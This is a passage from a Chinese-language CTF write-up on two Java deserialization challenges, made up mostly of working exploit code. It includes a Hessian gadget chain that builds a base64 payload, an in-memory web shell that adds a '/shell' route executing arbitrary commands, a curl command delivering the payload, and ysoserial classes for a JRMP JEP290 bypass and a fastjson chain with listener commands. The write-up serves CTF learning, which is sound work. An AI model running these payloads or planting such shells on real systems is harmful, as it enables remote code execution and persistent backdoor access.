import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.security.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class Hessian_SignedObject {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }
    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {ClassPool.getDefault().get(Evil.class.getName()).toBytecode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        ObjectBean delegate = new ObjectBean(Templates.class, obj);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);

        HashMap<Object, Object> hashmap = makeMap(root,"1");

        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signature = Signature.getInstance(privateKey.getAlgorithm());
        SignedObject signedObject = new SignedObject(hashmap, privateKey, signature);

        ToStringBean item = new ToStringBean(SignedObject.class, signedObject);
        EqualsBean root1 = new EqualsBean(ToStringBean.class, item);

        HashMap<Object, Object> hashmap1 = makeMap(root1,"1");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
        hessian2Output.writeObject(hashmap1);
        hessian2Output.flushBuffer();

        byte[] bytes = byteArrayOutputStream.toByteArray();
        String exp = Base64.getEncoder().encodeToString(bytes);
        System.out.println(exp);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);
        hessian2Input.readObject();
    }
}
```
最后一步就是回显了，但是发现环境是HttpHandler，不是我们平常遇到的tomcat和spring，需要重新构造内存马，首先写一个handle下断点调试
可以通过`Thread.currentThread()`或`Thread.getThreads()`中获取
![](https://img-blog.csdnimg.cn/4a0cc63f383b464b835e40923e31770e.png)
```
Thread.currentThread()-->group-->threads[1]-->target-->this$0-->contexts-->list[0]-->handler
```

接下来写一个handler的内存马就可以了，参考Y4tacker师傅，发现反射覆盖handler过于暴力，那就写一个温柔一点的，改成调用createContext来创建新的路由
```java
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class InjectHandle extends AbstractTranslet implements HttpHandler {
    static {
        //获取当前线程
        Object o = Thread.currentThread();
        try {
            Field groupField = o.getClass().getDeclaredField("group");
            groupField.setAccessible(true);
            Object group = groupField.get(o);

            Field threadsField = group.getClass().getDeclaredField("threads");
            threadsField.setAccessible(true);
            Object t = threadsField.get(group);

            Thread[] threads = (Thread[]) t;
            for (Thread thread : threads){
                if(thread.getName().equals("Thread-2")){
                    Field targetField = thread.getClass().getDeclaredField("target");
                    targetField.setAccessible(true);
                    Object target = targetField.get(thread);

                    Field thisField = target.getClass().getDeclaredField("this$0");
                    thisField.setAccessible(true);
                    Object this$0 = thisField.get(target);

                    Method createContext = Class.forName("sun.net.httpserver.ServerImpl").getDeclaredMethod("createContext", String.class, HttpHandler.class);
                    createContext.setAccessible(true);
                    createContext.invoke(this$0,"/shell",new InjectHandle());

//                    Field contextsField = this$0.getClass().getDeclaredField("contexts");
//                    contextsField.setAccessible(true);
//                    Object contexts = contextsField.get(this$0);
//
//                    Field listField = contexts.getClass().getDeclaredField("list");
//                    listField.setAccessible(true);
//                    Object lists = listField.get(contexts);
//                    java.util.LinkedList linkedList = (java.util.LinkedList) lists;
//
//                    Object list = linkedList.get(0);
//
//                    Field handlerField = list.getClass().getDeclaredField("handler");
//                    handlerField.setAccessible(true);
//                    handlerField.set(list,new InjectHandle());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void handle(HttpExchange t) throws IOException {
        String response = "MemoryShell";
        String query = t.getRequestURI().getQuery();
        String[] var3 = query.split("=");
        ByteArrayOutputStream output = null;
        if (var3[0].equals("cmd")){
            InputStream inputStream = Runtime.getRuntime().exec(var3[1]).getInputStream();
            output = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int n = 0;
            while (-1 != (n = inputStream.read(buffer))) {
                output.write(buffer, 0, n);
            }
        }
        response+=("\n"+new String(output.toByteArray()));
        t.sendResponseHeaders(200, (long)response.length());
        OutputStream os = t.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

}
```
最后就用curl传进去就可以了
```bash
curl --data-binary @hessian http://9c0da41a-6343-40a3-88f6-a36fcced4d1a.node4.buuoj.cn:81/?token=HFCTF201Q
```
![](https://img-blog.csdnimg.cn/ff13ede96a804f9f872a4292dbe2de97.png)


参考：
[关于Hessian2二次反序列化中我学到了几点](https://xz.aliyun.com/t/11061)
[Hessian 反序列化知一二](https://su18.org/post/hessian/)
[Hessian 反序列化及相关利用链](https://paper.seebug.org/1131/)
[Java安全学习——Hessian反序列化漏洞](https://goodapple.top/archives/1193)
[2022虎符CTF-Java部分](https://y4tacker.github.io/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/)
[虎符 2022 ezchain](https://ha1c9on.top/?p=1973)


### [2022网鼎杯 玄武组]ezjava
拿到源码首先看一下存在的依赖
![](https://img-blog.csdnimg.cn/0c1bf2c2a1e9406897d0be09f318116a.png)

发现存在fastjson1.2.48，众所周知 JSONObject 的toString可以调用getter，那么链就很简单了
```
javax.management.BadAttributeValueExpException#readObject
com.alibaba.fastjson.JSON#toJSONString
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties
```

回过头来看到代码
![](https://img-blog.csdnimg.cn/b3efcea923ad48b1bdbea88d7c921c86.png)

很明显的反序列化，跟进到 EInputStream
![](https://img-blog.csdnimg.cn/bc6f078f80c8491dbbda5bf04e3b4aa2.png)

发现重写了resolveClass，只能使用JDK自带的类，导致了⾃定义类无法被加载，那么就只能使用原生反序列化了，但是这里jdk版本并不是jdk7u21和jdk8u20，所以要找一个新的方法

这里使用的是JRMP反序列化，在 jdk<8u241都可以攻击，我本地是8u231，需要绕过jep290的8u231修复
即：[An Trinhs RMI Registry Bypass](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/)

```java
package ysoserial.payloads;

import ysoserial.payloads.util.PayloadRunner;

import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.*;
import java.util.Random;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.util.Reflections;

public class JRMPClient_bypass_jep_jdk241 extends PayloadRunner implements ObjectPayload<Remote> {

    public Remote getObject (final String command ) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));

        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler((RemoteRef) ref);
        RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(
            RMIServerSocketFactory.class.getClassLoader(),// classloader
            new Class[] { RMIServerSocketFactory.class, Remote.class}, // interfaces to implements
            handler// RemoteObjectInvocationHandler
        );
        // UnicastRemoteObject constructor is protected. It needs to use reflections to new a object
        Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null); // 获取默认的
        constructor.setAccessible(true);
        UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(null);
        Reflections.setFieldValue(remoteObject, "ssf", serverSocketFactory);
        return remoteObject;
    }

    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient_bypass_jep_jdk241.class.getClassLoader());
        PayloadRunner.run(JRMPClient_bypass_jep_jdk241.class, args);
    }
}
```
然后打fastjson就可以了
```java
package ysoserial.payloads;

import com.alibaba.fastjson.JSONObject;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;
import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

public class FastJson extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
    @Override
    public BadAttributeValueExpException getObject(String command) throws Exception {
        Object templatesImpl = Gadgets.createTemplatesImpl(command);
        JSONObject jo = new JSONObject();
        jo.put("oops",templatesImpl);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, jo);
        return val;
    }
    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }
}
```
需要重新install一下生成 ysoserial ，最后监听
```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 FastJson "calc"
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient_bypass_jep_jdk241 "127.0.0.1:1099"|base64 -w0
```
![](https://img-blog.csdnimg.cn/61559c218e9f4352900198ffb9f84df8.png)

成功反弹计算器

参考：
[Java JRMP攻击](https://www.cnblogs.com/zpchcbd/p/14934168.html)
[Java安全之ysoserial-JRMP模块分析（一）](https://www.anquanke.com/post/id/228918)
[网鼎杯2022之java](https://dem0dem0.top/2022/09/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2022%E4%B9%8Bjava/)
